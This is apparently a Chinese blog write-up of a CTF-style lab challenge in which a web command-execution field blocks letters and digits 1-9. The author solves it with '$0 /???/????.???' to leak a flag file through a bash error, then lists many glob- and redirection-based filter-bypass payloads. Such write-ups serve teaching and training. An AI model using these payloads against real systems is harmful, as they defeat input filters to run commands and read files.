---
title: 好靶场-数字0的奇迹-WP
url: https://mp.weixin.qq.com/s/_tnyUrD48wgyCWCoGh_9mw
source: Doonsec's feed
date: 2026-01-16
fetch_date: 2026-01-17T03:20:33.440018
---

# 好靶场-数字0的奇迹-WP

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZSpB01qztxHEVRltBX1OZRzUSQc2EpuNQzAG8dibicOHvtUh0WkPeickhg/0?wx_fmt=jpeg)

# 好靶场-数字0的奇迹-WP

原创

泷羽Sec静安
泷羽Sec静安

泷羽Sec-静安

![]()

在小说阅读器中沉浸阅读

> 关注**泷羽Sec**和**泷羽Sec-静安**公众号，这里会定期更新与 OSCP、渗透测试等相关的最新文章，帮助你理解网络安全领域的最新动态。

![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZFEKu4xZz5QVUQWFic0icbGYn2lczSO9yL9gBnTYtnl5rPxxCbCsY0EsQ/640?wx_fmt=png&from=appmsg "null")

学安全，别只看书上手练，就来好靶场，本WP靶场已开放，欢迎体验：

🔗 入口：http://www.loveli.com.cn/see\_bug\_one?id=368

✅ 邀请码：48ffd1d7eba24bf4

🎁 填写即领 7 天高级会员，解锁更多漏洞实战环境！快来一起实战吧！👇

今天这个靶场限时免费，我一看到名字就来了兴趣，让我来研究好靶场的大王到底有多0？

![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZrPRSkibiaUh3YIET5c4a03LSPDT26SPhECZRwpPrqaMGAcxpG6fxuwgw/640?wx_fmt=png&from=appmsg "null")

## 解题过程

打开一看是一个网页，还勾引你去执行命令。
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZYjibh7EgZxJcaeCzlibDD0mOKhAKMprDGhsGxu2A3TAWrLfyRibTSat2A/640?wx_fmt=png&from=appmsg "null")

当我想要ls一下的时候就提示执行不允许
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZ0eTPPicibZVq3yILmicI042X0tkz6P15e9xYTqJ6gWyyxib2PSiaDiaxCkibg/640?wx_fmt=png&from=appmsg "null")

不是，逗我玩呢？数字1-9没有0，那我试一下0。

![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZh4DrbicLdZrnAWqo0wm4ZkYMjia7jLyic4daWwlJEic3TmC3TPkic4f9nqQ/640?wx_fmt=png&from=appmsg "null")

好像是可以，但是提示000没有这个命令
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZ0riav1yD9HAtsxEWmgCdAoOYYfamYlT1DAwmVFCJJ9fFvwFumKmPF0w/640?wx_fmt=png&from=appmsg "null")

用分号是可以正常分割两段命令，说明Linux系统命令的字符是可以正常工作的。![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZyApibDbo9via6WiabdhPqZzxic2t6ktsPdZA51Txpv2Ntv8saM2lpGvFUg/640?wx_fmt=png&from=appmsg "null")

查询Linux命令大全和特殊符号大全，发现应该是要用通配符引导到`/tmp/flag.txt`文件上

尝试一下波浪符号回到当前用户的目录，发现这个靶场确实很0，没有0就执行不了
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZQGGvOGIeWjaibDkwZwt8Qq582YiaibiaFiafE66j41Ath7icibWRFtxRCBNQg/640?wx_fmt=png&from=appmsg "null")

好的，正常返回，得知当前目录是/app
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZjxmVq3aXZqwC79uwbicsV1hgCqkRWhibF5g5wdvTkWgLnGH1N7AZ2L7g/640?wx_fmt=png&from=appmsg "null")

### 分析可用字符

在如此严格的限制下，我们能利用的元素有限：

| 可用元素 | 作用 |
| --- | --- |
| `$0` | 当前 shell（通常是 `/bin/bash`） |
| `$?` | 上一条命令的返回值 |
| `?` | 通配符，匹配单个任意字符 |
| `*` | 通配符，匹配任意长度字符串 |
| `/` | 路径分隔符 |
| `.` | 文件名分隔符 / source 命令 |

中间我尝试用../跳目录没有成功，最后发现`?`符号可以代表一个字符，和`*` 号不同，问号只占一个字符，而星号可以是任意长度，所以要用问号占位才能比较准确的匹配。然后是cat的功能用`$0`代替。

### 构造执行命令

常规读取命令如 `cat`、`head`、`tail` 都包含字母，无法使用。

**关键突破点：`$0`**

* • `$0` 代表当前 shell 程序（`/bin/bash`）
* • 不包含任何字母或数字 1-9
* • 可以用它来执行脚本文件
  当 bash 尝试将非脚本文件作为脚本执行时：

```
bash /tmp/flag.txt
```

如果 flag.txt 内容是：

```
flag{xxxxxx}
```

Bash 会尝试把 `flag{xxxxxx}` 当作命令执行，由于找不到该命令，会输出错误信息：

```
/tmp/flag.txt: line 1: flag{xxxxxx}: command not found
```

**错误信息中包含了 flag 内容！**

最后输入

```
$0 /???/????.???
```

![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZjuv7087w5191VMlaSEVILnGvVU2GPgzic93AFq1BFfaQ4hLRDzqT2yw/640?wx_fmt=png&from=appmsg "null")

flag{c220c5ff2acd45f79eadf8e798abd021}

## 发散思路-不做0的姿势还有哪些(bushi)

![WPS拼图0.png](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZVU5V8aUpNfhTGicRLBd7q9EP4DA8PzibadXv8QeY05p1kcBxePPSY2gQ/640?wx_fmt=png&from=appmsg "null")

WPS拼图0.png

### 1. 文件描述符类（带 0）

```
. /???/????.???>&0      # 重定向到 stdin
. /???/????.???<&0      # 从 stdin 读
. /???/????.??? 0>&0    # fd 0 重定向
$0 /???/????.???        # bash 执行
$0</???/????.???        # stdin 重定向
. /???/????.???|$0      # 管道给 $0
. /???/????.???||$0     # 逻辑或
. /???/????.???&&$0     # 逻辑与
$0 /???/????.??? 0>&0
```

### 2. 带 $0 的变体

```
$0 /???/????.???        # 经典解法
${0} /???/????.???      # 花括号写法
"$0" /???/????.???      # 引号包裹
($0 /???/????.???)      # 子 shell
```

### 3. 分号/管道 + 0

```
. /???/????.???;0       # 你发现的
. /???/????.???|0       # 你发现的
. /???/????.???;$0      # source 后执行 bash
. /???/????.???&$0      # 后台执行
```

### 4. Here-string / Here-doc（带 0）

```
$0<<<0                        # 简单测试
$0<&0</???/????.???           # 组合重定向
$0 0<<<. /???/????.???       # 变体
```

### 5. 数组/切片相关（带 0）

```
${!0}                         # 间接引用
${0:0}                        # 切片
${0:0:0}                      # 空切片
${0:0} /???/????.???
${0%%0} /???/????.???
${@:0} /???/????.???         # 参数数组切片
${*:0} /???/????.???         # 同上
```

### 6. 算术展开（带 0）

```
. /???/????.???;$((0))        # 算术展开得 0
$0 /???/????.??? $((0))       # 传参
$0 /???/????.??? $((0+0))         # 0+0=0
. /???/????.???;$((0))            # source 后执行算术
$0 /???/????.??? $[0]             # 旧式算术展开
```

### 7.进程替换（如果支持）

bash

```
$0 <(. /???/????.???) 0      # 进程替换
```

![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZokvfZE54t7RWAoGKfCDOGDOictXic9uibLbLgkdMicQQPibap1FjdwH6E4g/640?wx_fmt=png&from=appmsg "null")

全部都是0~那密密麻麻的0，我只在成都见过

## 总结可能的 payload

| Payload | 说明 |
| --- | --- |
| `$0 /???/????.???` | bash 执行文件 |
| `. /???/????.???;0` | source + 执行 0（报错） |
| `. /???/????.???|0` | source + 管道给 0 |
| `. /???/????.???>&0` | source + 重定向到 fd 0 |
| `. /???/????.???<&0` | source + 从 fd 0 读 |
| `$0</???/????.???` | bash 读取文件作为输入 |

题目设计得很巧妙，强制用 0 既是限制也是提示！

## 参考资料

* • Bash Special Parameters[1]
* • Shell Globbing[2]
* • GTFOBins - Unix Binaries Bypass[3]
* • Linux命令大全-菜鸟教程[4]
* • Linux 特殊字符详解：从基础到实践[5]
* • Linux 终端特殊符号含义大全[6]

---

🔔 **想要获取更多网络安全与编程技术干货？**

关注 **泷羽Sec-静安** 公众号，与你一起探索前沿技术，分享实用的学习资源与工具。我们专注于深入分析，拒绝浮躁，只做最实用的技术分享！💻

马上加入我们，共同成长！🌟

👉 **长按或扫描二维码关注公众号**

直接回复文章中的关键词，获取更多技术资料与书单推荐！📚

#### 引用链接

`[1]` Bash Special Parameters: *https://www.gnu.org/software/bash/manual/html\_node/Special-Parameters.html*
`[2]` Shell Globbing: *https://tldp.org/LDP/abs/html/globbingref.html*
`[3]` GTFOBins - Unix Binaries Bypass: *https://gtfobins.github.io/*
`[4]` Linux命令大全-菜鸟教程: *https://www.runoob.com/linux/linux-command-manual.html*
`[5]` Linux 特殊字符详解：从基础到实践: *https://geek-blogs.com/blog/linux-special-characters/*
`[6]` Linux 终端特殊符号含义大全: *https://blog.csdn.net/qq\_42059060/article/details/130787026*

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibW5p6wbicQ0VW9SdZ5W8ZWkqe9tVTwyQgoXibAE7B1CTqg3xb7Cficq1keBssjNq9n4uR4OxLWgVDU3w/0?wx_fmt=png)

泷羽Sec-静安

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibW5p6wbicQ0VW9SdZ5W8ZWkqe9tVTwyQgoXibAE7B1CTqg3xb7Cficq1keBssjNq9n4uR4OxLWgVDU3w/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过